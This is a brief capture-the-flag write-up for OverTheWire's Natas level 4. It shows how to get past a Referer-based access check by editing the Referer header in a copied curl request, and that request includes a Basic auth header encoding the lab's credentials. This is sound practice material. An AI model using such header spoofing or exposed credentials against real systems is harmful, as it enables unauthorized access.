# Natas4 writeup

Upon entering the site we are met with this message
" Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" "

To complete this level we need to make it appear that we are coming from natas5.

## Modifying the referer

I will use `curl` to modify the HTTP headers.

### Copy the request
Navigate to the network tab in the Developer tools.
Refresh the page.
Find a GET request to `index.php`.

Right click on the request and click copy value -> copy as cURL

You will get a header similar to
```bash
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:151.0) Gecko/20100101 Firefox/151.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://natas4.natas.labs.overthewire.org/' \
  -H 'Sec-GPC: 1' \
  -H 'Authorization: Basic bmF0YXM0OkpEclBudVpBS3lsNk1raXFRR0ZJZGRycXB2Z09BU3Ro' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
```

### Change the referer
change this line
```bash
-H 'Referer: http://natas4.natas.labs.overthewire.org/index.php'
```
to:

```bash
-H 'Referer: http://natas5.natas.labs.overthewire.org'
```
Notice I have removed `index.php`. For this to work the referer has to be on the root of natas5.

Paste the new command into your terminal.




